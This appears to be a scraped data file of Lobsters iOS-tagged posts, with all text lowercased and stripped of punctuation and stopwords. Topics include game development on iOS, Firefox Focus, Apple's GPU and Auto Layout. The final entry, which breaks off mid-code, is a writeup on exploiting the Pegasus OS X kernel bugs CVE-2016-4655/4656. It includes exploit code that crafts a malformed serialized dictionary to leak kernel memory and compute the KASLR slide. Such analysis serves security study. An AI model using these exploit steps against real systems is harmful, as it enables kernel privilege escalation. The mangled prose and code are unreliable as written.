whateveryouwant programming language compiler day would go kotlin service browsing licensing music sound effect service hiring contractor artwork maybe level design hosted datastore seriously nt administer source hosting bug tracking service bitbucket good lawyer good accountant twenty year ha kid put ten year spread past twenty year started character rhialto turn march term total personyears hundred largely due area design contributed dozen passionate volunteer amazing much stuff access since started project back back java talking java fancy lambda stream talking java oreilly book referee front roll everything back uphill way snow actually game started c migrated java never looked back went something life crisis year working game productivity tanked code base grew wanted back stopped working game part went graillike quest find good language one ultimately unsuccessful although learned lot got good rant nowadays though sheesh github infinite supply highquality library cloud provider hosted service stack overflow infinite supply answer every question ever encounter service available payment contractor everything else could want mean startup dream come true way productive needed time machine even game like despite simple appearance true mmorpg surprising depth basically infinite amount work lifetime work practice triage time management stress management really anyone got ta want bad enough apple v android enough material lot blog post love spend time exploring google cloud platform gcp future article learned thing two android well kotlin absolutely entrancing nt used yet anything serious one best new language emerge long long time would love talk kotlin point today though thought offer musing apple io store ecosystem still expert nt anything iosrelated work personal impression collected making game lot people asked first mobile client io rather android answer monetization io straightup easier monetize android cultivated frugal audience marketing hardware choice cultivation success android user tend frugal nt mean nt spend money mean cautious friend done simultaneous iosandroid release apps invariably io user outspend android user anywhere anecdotally sure little googling enough support confirmation bias like picked io started nt know objectivec started swift came couple month far enough development wary enough prior experience new language opted continue objc obviously today swift nt always timeconstrained could even start introducing swift classbyclass swift cool actually reminds lot kotlin think language designer must sort clique day whether know io well much good thing feel familiar least done sort ui programming career done java awt swing microsoft mfc whatnot xwindows work web programming whatever rarely anything major tinkered ui throughout career frontend ui skill every engineer even one framework know well coming framework certain expectation met io mvc framework add view subviews hook lifecycle event expect learning objectivec say four day thanks excellent big nerd ranch book able start cranking ream code copying directly stack overflow tradition making big deal io almost boring familiarity android exact opposite intuitive familiar got ta little careful since recently joined android tool team google nt want throw anyone bus best could environment situation started back early featured phone nt even memory addresscontact slot awful fine thanks moore law even wearable android io watch gig storage phat cpu decision made turned retrospect overly conservative result android apis framework far far far would expect come literally ui framework planet feel alien reddit thread pretty well sum early experience android development much love make android client game going happen plus still iterating heavily io ui might well wait stabilizes bit enough android today always gauge edgy blog post likely get fired little indicator redlining let move back apple io apple good bad ugly objective c nt bad continued iterating even though string handling comically verbose namespacing ton modern feature missing language pretty capable overall generic literal syntax setsdictionariesarrays trycatchfinally macro extremely wellimplemented lambda proper closure capturing unlike nearly every nonfunctional language property many modern convenience syntax awful get pretty weird bridging c apis whole wind writing le code think fact various blogger measured recall correctly consensus android java verbose objectivec pretty counterintuitive java language verbose may clearly le verbose objectivec happening io good apis wind needing write lot le code get job done objc nt bad swift look really good apis good documentation solid apple aggressively deprecating crummy old apis like uialertview favor betterdesigned one everything still system see generation whole layer api access dating way back old next computer late heck everything io start n nextstep nt use stuff apple constantly layering new apis modernize unlike know uh people xcode pretty good used bad bad yes crash like yes refactoring support abysmal visual studio pretty good good enough copying code stack overflow really shame whatsoever xcode work great even format complain besides use emacs serious editing good language apis tool bad well apple review process really really really long convoluted sure totally understand million developer trying shoehorn crap store trying make strong quality stand mean wild ride making anything complicated flashlight app first go checklist roughly seventeen thousand rule make sure addressed since result veto would nt know checked exactly sixteen thousand nine hundred ninetynine rule carefully app rejected nt mess follow story app rejection epic enough opera nutshell apple requires apps support network none major cloud provider supported time submission late september pretty well covered http use socket hosed game us direct tcptls connection cloud instance nt work network app kicked curb like much garbage least quickly technical consideration logical thing got knee begged exception gon na cheesy hack tunnel provider fixed ip address single instance well yeah exactly going push came shove get review even though completely nonscalable desperate time fortunately mere six week finally sending angryish still cravenly begging note asking wth granted exception year backdated really month whatevs approved ugly kidding haha joke approved gave exception also threw major feature request lordy almost like monopoly something nt like game required sign via social network facebook google twitter since signin sdks managed wire far asked implement wyvern account sigh relieved got exception nt fight called back ask ok require email address accountpassword recovery functionality also use email address tie character together said fine went work even though game already alpha six week long implemented wyvern account new database table new web service new api service new ui screen registration account creation password resetting new plumbing passing credential server blah blah blah god dammit nerve ask big feature week later finished realized fbgoogletwitter minimum age requirement year minimum coppa protected apple threw curveball need underage reporting god know else still working lawyer go back plan b iosland b begging except actually sort agree apple need feature everyone social network example uncontacted tribe deep south american rainforest facebook yet although believe still eligible amazon prime also alpha tester struggling guess lot people nt gmail prefer sign free account assume nsa responsible phenomenon mean likely need wyvern account another reason sort need wyvern account facebook google twitter different philosophy emailverification apis facebook philosophy roughly api call friend quota high wo nt worry year google philosophy roughly apis scale business quota high wo nt worry year twitter philosophy roughly go fuck exhaust tiny quota every day even adding credential caching player revalidate every hour even though dozen maybe fifty regular player right handful use twitter quota comically absurdly low probably going yank twitter launch would limit people fb google signin seems like enough option nt like maintain account think pretty well stuck takeaway well nt use twitter apis apple jerk around pretty much want better like basically prepare long review back good despite bump long road far stuff great testflight apple beta testing system working nicely provides crash report identified half dozen real issue far signup snap let tester help make sure stuff scale get many review turnaround time pretty good generally take day experience sure require manual review beta build already approved actual store launch every build requires another day review got pipeline going pleased overall straightforward really worried inapp purchase offer game though definitely paytoplay apple testing iap leaf lot desired sandbox requires setting separate account possible enable production iap real money actual launch sandbox environment make really easy screw transaction device prompt store login every minute rest miserable life likely hereafter mess sort enable iap betatestflight free mean player would able acquire million coin free would require perform full reset everyone back level launch trying avoid idea iap really work got working sandbox one point hoping work prod confident working going charge app forestall possibility massive meltdown casual player tourist basically eating server resource nt want get gigantic bill google need limit growth best going forward building game lot fun learned project anything ever done workrelated job something big project force pay attention everything way rarely corporation nt know going hit statistically probably pretty darn loyal player game five year brought back hundred old timer appeared nowhere many purchase io device play splurged started playing insane hour ratio concurrent player crazy old day server could comfortably support concurrent player typically active selflimiting one server back alpha tester ratio playing upwards hour day around clock world tester japan england new zealand spain nigeria toronto east coast west coast forget talking group regular diversity quite remarkable letter wrote back game went could port cloud give pretty good sense much people like report back month let know launch went meantime want play visit http ghosttrackcom hope see online rhialto
333,Lobsters,ios,Apple iOS,"Introducing Firefox Focus ‚Äì a free, fast and easy to use private browser for iOS",https://blog.mozilla.org/blog/2016/11/17/introducing-firefox-focus-a-free-fast-and-easy-to-use-private-browser-for-ios/,introducing firefox focus free fast easy use private browser io,firefox focus automatically block tracker tracker follow around web make mobile web page slow app store,today pleased announce launch firefox focus free fast easy use private browser io firefox focus live age many user lost trust lack meaningful control digital life user seems though web activity follow everywhere across device across account make matter worse web often feel cluttered introducing firefox focus private iphone browser focus designed time want leave record phone may looking information certain situation sensitive search engagement ring flight la vega expensive cigar example sometimes want super simple super fast web experience tab menu popups firefox focus private iphone browser give firefox focus automatically block tracker focus set default block many tracker follow around web need change privacy cookie setting browse peace mind feeling confident knowledge instantly erase session single tap menu needed firefox focus erase button much make mobile web page slow technology used track user web firefox focus block tracker likely notice performance boost many site track behavior occasionally see site work dependent tracking mind kind tracking firefox focus make easy open current site either firefox safari look forward feedback firefox focus download firefox focus app store firefox focus continues operate safari content blocker io user able take advantage tracking protection safari firefox focus
334,Lobsters,ios,Apple iOS,App Store Submission Checklist,https://github.com/ubclaunchpad/app-store-checklist,app store submission checklist,join github today sign file permalink app store checklist submitting app store make sure app fullfills check safety performance business design legal resource reload reload,checklist submitting app store dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time app store checklist submitting app store make sure app fullfills check safety performance business design legal checklist submitting app store resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
335,Lobsters,ios,Apple iOS,Dash for iOS is now open source,https://github.com/Kapeli/Dash-iOS,dash io open source,discontinued discontinued dash macos http kapelicomdashios dash macos installation instruction app store xcode dash io source code contact contribution guideline,discontinued dash io discontinued please check dash macos instead dash give ipad iphone instant offline access api documentation set information dash check http kapelicomdashios also please check dash macos installation instruction recommended way installing dash app store alternatively use xcode install dash io device using apple id need install xcode download dash io source code git clone http githubcomkapelidashiosgit open dash iosxcworkspace xcode go xcode preference account add apple id xcode sidebar select dash io go general identity append word end bundle identifier eg comkapelidashios name unique select apple id signing team connect ipad iphone using usb select xcode product menu destination press cmdr product run install dash install using free nondeveloper account make sure rebuild dash every day otherwise quit launch certificate expires contact need help contribution guideline currently accepting pull request fix bug addimprove feature ca nt allocate time review pull request refactor thing add comment try maintain coding style use eg curly brace line know bit different anyone else might disagree section code different style would make thing worse
337,Lobsters,ios,Apple iOS,"Mosh for iOS, Best SSH Client - Blink Shell for iOS",http://www.blink.sh/,mosh io best ssh client blink shell io,air terminal,air terminalswe promise end liking simplicity blink io much want take big screencreate distractionsfree workstation connect ipad pro display get full resolution crystal clear terminalgiving demo next presentation blink displayed remote apple tv
339,Lobsters,ios,Apple iOS,Apple Keynote October 2016,http://www.apple.com/apple-events/october-2016/,apple keynote october,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
340,Lobsters,ios,Apple iOS,A Look Inside Apple‚Äôs Custom GPU for the iPhone,http://www.realworldtech.com/apple-custom-gpu/,look inside apple custom gpu iphone,mike wuerthele apple insider wrote apple boost performance power efficiency smaller register free conversion unlocks halfprecision programmer technical difference reveal apple custom gpu preserved back mac next discus comment,page first model apple iphones ipads licensed used powervr gpus imagination technology graphic apple even owns around imagination imagination biggest customer accounting company revenue apple began licensing standard arm cpu core design believe company similarly shifted licensing powervr designing custom gpu new gpu first shipped processor iphone descendant also fusion processor iphone modern gpu like one inside apple iphone ipad three major component must work together harmony render scene first fixedfunction graphic hardware responsible task like processing api command triangle rasterization raster output second shader core heart gpu executes programmable shaders eg vertex geometry pixel compute shaders last graphic driver software run cpu tie everything together coordinating activity gpu driver transforms graphic application written metal opengl e apis series command fixedfunction hardware programmable shaders execute shader core one driver largest component compiler generates machine code run shader core older generation fixedfunction hardware shader core driver licensed apple imagination technology however last year apple aggressively hiring graphic architect driver compiler engineer place like amd intel google nvidia design custom gpu example mike wuerthele apple insider wrote people imagination technology hired away apple earlier year apple gpu appears still use powervr fixedfunction graphic hardware however based variety public evidence clear apple replaced programmable shader core efficient higher performance design take advantage custom shader core apple also developed driver compiler emit code architecture overall result apple gpu share heritage powervr unique proprietary design worldclass design impressive performance power efficiency processor best score nearly every mobile graphic benchmark fusion faster still architecture apple gpu never publicly documented order developer take advantage gpu understand write shader program metal opengl compiler wwdc apple engineer gave presentation advanced metal shader optimization contains detailed tuning guideline architectural detail date custom gpu architecture powervr series gpu also poorly documented imagination technology shared basic compiler optimization manual comparing available detail two make clear distinct particular apple register file data conversion function better suited performance powerefficiency easier compiler targetapple boost performance power efficiency smaller register opengl e mobile graphic api apple proprietary metal api support halfprecision floatingpoint format image data calculation consume le energy singleprecision calculation halfprecision computation lose accuracy faster singleprecision circumstance however many graphic image processing machine learning workload halfprecision accurate enough give correct result especially since display bit dynamic range per pixel register file apple gpu composed register ideal fit halfprecision data based public presentation company see singleprecision floatingpoint value data consume two register result register file store twice many variable variable apple engineer emphasized using halfprecision offer much better performance power efficiency singleprecision making clear architecture focused halfprecision primary design point contrast powervr series gpus use register designed singleprecision calculation based tuning guideline imagination technology see series common instruction fmad fmul fadd operate halfprecision data simply flush many bit source destination register zero instruction operate two simd element within single register series extends capability instruction simd execution quite distinct scalar execution using register powervr storing data format waste register space automatically double number variable held register file using data reduce memory bandwidth energy consumed intrinsically increase performance power efficiency much apple gpufree conversion unlocks halfprecision programmer one common challenge data calculation fine reduced precision part need greater precision example shader calculates color large block pixel calculates average probably use individual pixel may need use summing value together count correctly converting pixel data expensive whole shader use math generate correct answer apple gpu offer superior conversion different data type encourage mixing precision thereby creating opportunity higherperformance lowerpower calculation according apple presentation data type conversion free suggests conversion hardware sits standard data path appoach expensive term hardware also dramatically simplifies compiler make much easier programmer write good software powervr series convert different precision data type definitely free optimization manual specifically state data conversion eg higher lower precision lower higher precision cost recommends developer write shader program minimize number conversion see technical difference reveal apple custom gpu contrast register file data conversion apple imagination gpus tremendous register file organization fundamental shader core impact design nearly everything instruction set architecture shader core execution unit scheduling logic one example register size determines data path wiring run throughout shader core data conversion quite substantial make big difference compiler developer powervr series gpu fairly similar previous generation series crucially also us register based difference logical conclusion apple gpu us proprietary shader core internally designed extension mean apple also developed shader compiler opengl e metal apis likely graphic driver even benchmark caught difference older gfxbench submission describes gpu iphone apple gfxbench submission original submission public gfxbench database altered mention scrubbed however submission preserved back mac koreanlanguage website many difference apple gpu powervr could probably detected running directed test metal shaders comparing result similar opengl e shaders powervr gpus also likely metal unique feature possible powervr gpus however difference may reflect unique hardware choice example apple gpu support opengl e whereas powervr gpus run later version however difference could easily due software driver encouraging developer use metal rather hardware page next discus comment
341,Lobsters,ios,Apple iOS,An iOS Escape Key App,https://github.com/brianmichel/ESCapey,io escape key app,escapey motivation enter escapey use escapey known issue,escapey esc key solution new apple laptop motivation welp problem use cool text editor really need access hardware escape key sudden come along physical key sight maybe apple offer dongle need purchase bunch home work nt sound workable answer enter escapey escapey macos server io client application pair allow turn io device escape key come know love use escapey turn esc server indicated following screenshot run io client connect machine tapping connect button io interface connected tap esc button heart content known issue garbage code wrote amuse nt depend unless really like whatever reason
342,Lobsters,ios,Apple iOS,How we used data to re-arrange our open office to optimize for noise-level and focus,https://segment.com/blog/how-we-added-10-people-without-hiring-a-soul/,used data rearrange open office optimize noiselevel focus,noise coming decibel noiserecording app,segment focus one four core value difficult team member focus office june ran internal team survey help hurt focus result showed chatter noise one biggest culprit distraction around office slack group channel came secondthese answer left u two difficult question solve noise problem open floor plan noise even coming get bottom decided build io app collect decibel level around office found noise level varied widely throughout office using new data changed office layout increase ability focus numerically speaking increased focused time measured survey equivalent hiring teammate beyond number feel great focus noise coming first thought bit chatty demanding quiet horrible collaborative work environment also noticed something odd people walked office often say wow one quietest office ever course survey said office noisy distractingthis discrepancy particularly confusing office open floor plan sound ought travel well around big open space strange two widely divergent story around quietness loudness officehere picture showing high ceiling plant open layout floorplan showing lack lot way sound bounce around view shown blue conflicting anecdotal story visitor teammate perplexing get bottom thing needed hard data better way collect data ambient sensor called iphones already sitting around office built app record decibel level different area give u real data understand situationthe io app tiny us apple avaudiorecorder class levelmetering passively collect report average maximum ambient decibel level every second server monitoring tool datadog opensourced decibel noiserecording app use add datadog api key gooriginally planned ask bunch people install phone around office vp engineering much better idea deploy ipads outside every conference roombelow see data collection point ipad mini red dot outside room graph show measurement august clearly showing spike noise office throughout day absolute value arbitrary data good relative comparison among thing see full db difference quietest loudest part office db feel roughly twice loud big difference finally average noise level result plus manual interpolation sparse data collection point overlaid floor plan office red loudest green quietest resolved mystery front office visitor hang twice quiet quieter compared area people work set anecdotal story right showed graph tony one security guard said oh yeah way quieter front office even night immediately ditch open floor plan although looking various option next office new noise level data gave u obvious way reduce distraction team needing quietest work area engineering product design move quietest part officelast month made big move team needing verbal collaboration segment sale support marketing team moved naturally louder part office team needing quiet engineering product design moved quietest part officewe still dialing part office became bit cramped rerun original focus survey team showed total focus time increased time office purely numerical sense could equate hiring people also feel awesome focusthe combination survey noise data incredibly helpful iterating towards productive office still lot idea test example started experiment team new war room layout keep looking way optimize environment productive fun measuring result go would love share result experimented measured result space
343,Lobsters,ios,Apple iOS,Auto Layout Demystified,https://spin.atomicobject.com/2016/09/26/auto-layout-demystified/,auto layout demystified,reddit equation acceptleft cancelright multiplier constant acceptwidth cancelwidth cancelright acceptleft anatomy constraint interface builder,local user group recently topic meeting one hot new crossplatform mobile development option really matter one usual uikit bashing expected since topic propose alternative programming model defend uikit agree use improvement however speaker say one thing auto layout heard rubbed wrong way heard people say thing like need mathematics phd understand auto layout need rocket scientist understand auto layout going get debate hard rocket science actually see reddit answer instead blog post show easy calculation auto layout fact linear equation simple elementary child could math people think auto layout hard well think xcode interface builder help situation xcode improved since auto layout introduced still hard see auto layout equation relates see interface builder let see demystify auto layout little equation let say two button want know far apart place could express relationship right edge cancel button left edge accept button describe another person would probably say something like accept button eight point right cancel button precise statement would left edge accept button eight point greater right edge cancel button equation would acceptleft cancelright constant wanted express width accept button relation width cancel button let say twice wide equation would following acceptwidth cancelwidth multiplier auto layout equation combine two one express kind relational constraint multiplier constant express position accept button relation cancel button need multiplier value one equation would following acceptleft cancelright express width accept button need constant becomes zero acceptwidth cancelwidth mystical equation need math phd figure „ÉÑ equation reverse express relationship distance two button item item reversed follows cancelright acceptleft think confusion start auto layout xcode interface builder always show equation order expecting logical think distance two button negative number want know equation apple great page explaining anatomy constraint next show interface builder us equation build constraint interface builder let create horizontal constraint two button going go different way create constraint interface builder several different way favorite way press control key drag constraint first item second drag ui element view controller give meaningful name document tree helpful understanding control looking attribute constraint xcode use name control attribute inspector easier identify control let look attribute horizontal constraint try find element equation interface builder add constraint xcode order equation may expecting number reversed see constant negative number first second item reversed believe trip people understanding going fix situation reversing first second item often clear head even though mathematical standpoint reverse negative constant becomes positive item appear order expect hopefully helpful someone new auto layout need hire mathematician lay control math pretty easy although xcode help situation sometimes
344,Lobsters,ios,Apple iOS,Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656),http://jndok.github.io/2016/10/04/pegasus-writeup/,analysis exploitation pegasus kernel vulnerability,analysis exploitation pegasus kernel vulnerability introduction pegasus spyware jndoknet introduction overview bug analysis exploitation conclusion overview binary format analysis explaining reading bug analysis infoleak useafterfree kernel infoleak kernel useafterfree exploitation exploiting crafting dictionary spawning user client reading property calculating kernel slide exploiting crafting dictionary mapping pivoting stack main chain conclusion follow twitter poc code available github credit thanks reference fjserna geometry innocent flesh bone returnintolibc without function call qwertyoruiopz qwertyoruiopz,analysis exploitation pegasus kernel vulnerability oct introduction hello everyone blog post decided talk two recent o xios kernel vulnerability abused pegasus spyware affecting o x io try kind indepth analysis bug exploitation technique used leverage since first blog post ever written let ask little patient expect errorssloppy writingwhatever find error find something confusing etc send email jndoknet best help last thing note reading focus o x kernel making actual use two bug io environment much complicated due security measure employed since post also aimed beginner keep straightforward stay o x post structured introduction overview osunserializebinary detail osunserializebinary data format work bug analysis analysis two vulnerability exploitation fun part conclusion overview osunserializebinary xnu kernel implement routine called osunserializexml used deserialize xmlformatted input basic kernel data object recently new function added osunserializebinary purpose xml counterpart format processed different osunserializebinary convert binary format basic kernel data object format simple albeit undocumented analyzing function code describe format osunserializebinary binary format binary data osunserializebinary process simply data stream integer contiguous value perhaps array integer better represent idea bunch integer one every integer describing something first integer required valid data stream unique signature every integer value us bit describe data type size integer also represent pure raw data define kosserializebinarysignature enum kosserializedictionary kosserializearray kosserializeset kosserializenumber kosserializesymbol kosserializestring kosserializedata kosserializeboolean kosserializeobject kosserializetypemask kosserializedatamask kosserializeendcollection see bit used indicate whether current collection bit used store actual data type bit used store actual element length since example always make something clear go binary data corresponds dict string aaa string boolean boolean dict see mark dictionary last element first collection boolean last element second collection encode string data aaa directly inline including null termination byte finally boolean need encode inline data since size last bit determines whether true false important thing note concept collection marking collection end collection basically group object level example element inside dictionary belonging collection crafting binary dictionary osunserializebinary important always mark end collection setting first bit flag kosserializeendcollection enum xml example better illustrate concept dict dict level end string aaa string string level boolean boolean bool level string bbb string string level boolean boolean bool level dict dict level string ccc string string level boolean boolean bool level end dict string ddd string string level boolean boolean bool level end dict see various level collection also see marked every last element every levelcollection forget osunserializebinary exit return bad argument error keep mind also note case outer dictionary mark last element since one element level hopefully better understand binary format ready start analyzing osunserializebinary code osunserializebinary analysis osunserializebinary called inside osunserializexml function detects unique binary signature beginning input data know data binary format xml pas everything osunserializebinary libkerncosunserializexmlcpp osobject osunserializexml const char buffer sizet buffersize osstring errorstring buffer return buffersize sizeof kosserializebinarysignature return strcmp kosserializebinarysignature buffer return osunserializebinary buffer buffersize errorstring xml must null terminated buffer buffersize return return osunserializexml buffer errorstring actual code osunserializebinary updated last o x vulnerable version available simply put code iterating buffer containing binary data one time parsing parsing create osobject returned caller returned object must container object mean object contain others practically speaking either dictionary array set since container object currently implemented format also mean one object level also called first collection object must container word binary data provide encapsulated either dictionary array set object level first valid container ignored basic premise let start looking code ok bufferpos sizeof next ok bufferpos buffersize break key next len key kosserializedatamask wordlen len end kosserializeendcollecton key newcollect isref false newdict newarray newset switch kosserializetypemask key case kosserializedictionary case kosserializearray case kosserializeset case kosserializeobject case kosserializenumber case kosserializesymbol case kosserializestring case kosserializedata case kosserializeboolean default break initialization basic sanity check function start main ok loop unserializing loop iterates binary data integer per integer deserializes data object beginning snippet located loop incrementing code also read current integer key length current data determined saved len finally boolean end set kosserializeendcollecton flag aka bit set current key data type inside key switched case properly allocating object corresponding formatted data type example let look kosserializedictionary case case kosserializedictionary newdict osdictionary withcapacity len newcollect len break osobject pointer point current deserialized object current loop set inside case case kosserializedata bufferpos wordlen sizeof bufferpos buffersize break osdata withbytes next len next wordlen break since osdata object expects inline data stream bufferpos properly incremented skip inline data avoid treating binary formatted input osdata object created using inline data set new instance finally next also incremented skip inline data reading switch statement able figure case pretty easily since code coincise let move switch statement ok break still null ie valid object deserialized loop exit isref setatindex objs objsidx ok break objsidx actually important part code since one bug related going describe bug later follow part carefully basically saying deserialized object reference ie pointer another object formatted data create via kosserializeobject push object inside objsarray array array created osunserializebinary keep track every deserialized object except reference said let take look setatindex macro define setatindex v idx idx v capacity ncap v capacity typeof v array nbuf typeof v array kalloccontainer ncap sizeof nbuf ok false v array bcopy v array nbuf v capacity sizeof kfree v array v capacity sizeof v array nbuf v capacity ncap ok v array idx index trying store bigger array size array enlarged otherwise simple dereference set performed let go back main loop code dict sym dict ok dict setobject sym true release sym release sym else sym osdynamiccast ossymbol sym str osdynamiccast osstring sym ossymbol ossymbol withstring str release ok sym else array ok array setobject release else set ok set setobject release else assert parent result ifelse statement actually responsible storing every deserialized object container talked earlier keep mind three variable dict array set null first loop remain dictionary array set found data stream mean result pointer returned object keep shifting forward data proper container object found hence every object level proper container proper container completely ignored focus dict branch since important useafterfree bug probably know dictionary contain alternating object one representing key value key osunserializebinary format specifies either osstring ossymbol osstring converted ossymbol automatically see snippet code maintain said alternation key value sym start null first loop else branch taken expected first element dictionary key casting ossymbol osstring ossymbol succeed next iteration handling value key since sym set sym branch taken dict setobject sym true properly set keyvalue pair dictionary sym set null since next iteration expecting key value almost done osunserializebinary let go newcollect end stackidx setatindex stack stackidx parent ok break parent dict newdict array newarray set newset end false boolean newcollect set container object found check switch case kosserializedictionary kosserializearray kosserializeset end set container object mean still object level container case parsing indented meaning go level done reach end object new container go back continue deserializing object previous container since kosserializeendcollection set object new container handle multiple level indentation every time new container encountered object algorithm push parent container stackarray start deserializing object new container end new container reached parent popped stackarray deserializing continues see parent pointer point container object containing current object pushed stackarray array find another kosserializeendcollecton flag object every object contained inside new container three general variable indicating container push dict array set also set new container kosserializeendcollecton found algorithm descends level needed end stackidx break j level deserialization done exit parent stackarray stackidx j pop parent stackarray stackidx set dict array j cast parent proper container resume deserialization dict osdynamiccast osdictionary parent j parent ca nt properly cast container abort array osdynamiccast osarray parent ok set osdynamiccast osset parent previous container retrieved stackarray saved parent three general variable mutually exclusively recasted parent object pushed previous container indentation needed new container last element parent container object belonging parent new container push everything new container exit new container parent xml example dict string string boolean boolean string string boolean boolean dict new level string string boolean boolean string string boolean boolean string string boolean boolean end level dict object new container go back level push inside outer dict string string boolean boolean end level dict dict string string boolean boolean string string boolean boolean dict end level new level string string boolean boolean string string boolean boolean string string boolean boolean end level dict nothing dict indent finally exit dict indeed lot explanation relatively straightforward code tried make thing clear possible explaining code never good reading code suggest go try clear eventual doubt reading osunserializebinary code finally time look bug real fun bug analysis two bug discussing blog post respectively former infoleak vulnerability latter useafterfree vulnerability going start infoleak move useafterfree quick note beginner try keep thing straight explain much possible next section also post several reference external link found end article read deepen knowledge kernel infoleak right first infoleak security vulnerability let attacker disclose information accessed many case information kernel address useful since help u calculate kaslr slide random amount kernel slid every time boot need slide carry code reuse attack rop let take look back kosserializenumber case osunserializebinary switch statement case kosserializenumber bufferpos sizeof long long bufferpos buffersize break value next value value next osnumber withnumber value len next break wrong check length osnumber create number arbitrary number byte little oversight easily turned infoleak registering user client object inkernel malformed osnumber property reading property causing kernel read byte osnumber bound since real max size osnumber bit check data get read value variable able specify check exploit later kernel useafterfree let ask useafterfree situation happens freed memory still reference somewhere get used imagine object freed internal data wiped somewhere program object still treated valid would case nasty behaviour obviously take advantage reallocating freed memory data get used get exploitation later bug actually caused code responsible casting deserialized osstring dictionary key ossymbol else sym osdynamiccast ossymbol sym str osdynamiccast osstring sym ossymbol ossymbol withstring str release ok sym casting code fine however see release free pointer specific loop pointing osstring deserialized object problem remember objsarray array deserialized object stored freeing code actually happens setatindex macro call mean freed osstring actually referenced objsarray since setatindex macro implement kind reference counting mechanism reference stored get removed would problem circumstance ie create reference object objsarray let take look kosserializeobject case switch statement case kosserializeobject len objsidx break objsarray len retain isref true break pointed used create reference object needed also pretty nice call retain afterwards make use freed object indeed beautiful useafterfree serialize dictionary containing osstring key paired value serialize kosserializeobject reference osstring freed time effectively calling retain freed object exploitation final part look exploiting two kernel bug achieve complete lpe o x keep mind many concept referenced outside scope post try quickly cover post external link exploiting start infoleak said infoleak useful break kaslr obtaining kernel slide breaking kaslr ready launch full attack exploiting bug obtaining code execution kaslr slide possible correctly execute rop payload pwn system create user client object kernel set property property bunch keypair value set using dictionary luckily also use binary format set property since api call directly call osunserializexml call osunserializebinary case binary data instead classic xmlformatted data let u create dictionary malformed osnumber used set property inside user client object create user client implicitly opening connection kernel service via ioserviceopen call however going use private call ioserviceopenextended ioserviceopen internally call private call along others going use declared iokitiokitmigh header file note binary must compiled macho link call guess legacy reason private call make life easier since many check done public one skipped private one infoleak exploiting plan review craft serialized binary dictionary contains malformed osnumber overlong size use serialized dictionary set property user client object kernel read set property osnumber back leaking adjacent data due long size use read data calculate kernel slide actual code kslideinfoleak void kernreturnt kr err machportt re machportnull master machportnull ioservicet serv ioconnectt conn ioiteratort iter kslide void dict calloc idx index data define writein dict data dict idx data idx writein dict signature always beginning writein dict kosserializeendcollection kosserializedictionary dictionary two entry writein dict kosserializesymbol key symbol char nul byte writein dict aaa key nul byte littleendian writein dict kosserializeendcollection kosserializenumber value bigsize number writein dict writein dict least byte big numbe hostgetiomaster machhostself master get iokit master port kr ioservicegetmatchingservicesbin master char dict idx re kr kernsuccess printf dictionary valid spawning user client n else return serv ioservicegetmatchingservice master ioservicematching iohdixcontroller kr ioserviceopenextended serv machtaskself ndrrecord iobufptrt dict idx err conn kr kernsuccess printf uc successfully spawned leaking byte n else return ioregistryentrycreateiterator serv ioservice kioregistryiteraterecursively iter ioobjectt object ioiteratornext iter char buf machmsgtypenumbert bufcnt kr ioregistryentrygetpropertybytes object aaa char buf bufcnt kr kernsuccess printf done calculating kaslr slide n else return k k k printf llxn buf k endif hardcodedretaddr kslide buf sizeof hardcodedretaddr printf kaslr slide kslide return kslide crafting dictionary going make use enum described create binary serialized data simplest way allocate memory write masked value using pointer void dict calloc idx index data define writein dict data dict idx data idx macro useful since let u write allocated memory keep index updated u time use using knowledge gathering far let go write concept dictionary xml dict symbol aaa symbol number number dict translating binary writein dict signature always beginning writein dict kosserializeendcollection kosserializedictionary dictionary two entry writein dict kosserializesymbol key symbol char nul byte writein dict aaa key nul byte littleendian writein dict kosserializeendcollection kosserializenumber value bigsize number writein dict writein dict least byte big number actually test dictionary valid without creating user client use ioservicegetmatchingservicesbin private call always found iokitiokitmigh header use later anyway trigger useafterfree hostgetiomaster machhostself master get iokit master port kr ioservicegetmatchingservicesbin master char dict idx re kr kernsuccess printf dictionary valid spawning user client n else return result equal dictionary created parsed correctly therefore valid established validity dictionary know set property let go create user client spawning user client mentioned call ioserviceopenextended service spawn user client service use important long provides user client example opening iohdixcontroller used disk stuff service spawn iohdixcontrolleruserclient object going serv ioservicegetmatchingservice master ioservicematching iohdixcontroller kr ioserviceopenextended serv machtaskself ndrrecord iobufptrt dict idx err conn kr kernsuccess printf uc successfully spawned leaking byte n else return first obtain port service using ioservicegetmatchingservice call filter service ioregistry via matching dictionary containing name ioservicematching open service spawning user client via ioserviceopenextended private call let u specify property directly presumably user client created property specified access need iterate ioregistry manually find read property causing infoleak ioregistryentrycreateiterator serv ioservice kioregistryiteraterecursively iter ioobjectt object ioiteratornext iter code simply create ioiteratort set serv ioregistry serv mach port representing actual driver object kernel since user client client main driver object user client created driver object ioregistry hence increment iterator one time obtain mach port representing user client user client object created kernel found ioregistry read property triggering infoleak reading property char buf machmsgtypenumbert bufcnt kr ioregistryentrygetpropertybytes object aaa char buf bufcnt kr kernsuccess printf done calculating kaslr slide n else return use private call ioregistryentrygetpropertybytes akin ioregistryentrygetproperty let u get raw byte directly point buf buffer contain leaked byte let print see k k k printf llxn buf k output valid number data stack valid number ret addr function return address first value actual number remember rest value leaked kernel stack point useful check kernel code read property user client understand bit going actual code located isioregistryentrygetpropertybytes function called ioregistryentrygetpropertybytes iokitkerneliouserclientcpp routine ioregistryentrygetproperty kernreturnt isioregistryentrygetpropertybytes ioobjectt registryentry ionamet propertyname iostructinbandt buf machmsgtypenumbert datacnt osobject obj osdata data osstring str osboolean boo osnumber offsetbytes unsigned int len const void byte ioreturn ret kioreturnsuccess check ioregistryentry registryentry entry configmacf maciokitcheckgetproperty kauthcredget entry propertyname return kioreturnnotpermitted endif obj entry copyproperty propertyname obj return kioreturnnoresources one day osdata common container base class data osdynamiccast osdata obj len data getlength byte data getbytesnocopy else str osdynamiccast osstring obj len str getlength byte str getcstringnocopy else boo osdynamiccast osboolean obj len boo istrue sizeof yes sizeof byte boo istrue yes else osdynamiccast osnumber obj j reading osnumber offsetbytes len numberofbytes byte offsetbytes ifdef bigendian byte const void byte sizeof len endif else ret kioreturnbadargument byte datacnt len ret kioreturnipcerror else datacnt len bcopy byte buf len obj release return ret reading osnumber look osnumber case else osdynamiccast osnumber obj offsetbytes j offsetbytes variable allocated stack len numberofbytes j read malformed length byte offsetbytes j byte ptr point stack variable ifelse statement byte datacnt len ret kioreturnipcerror else datacnt len 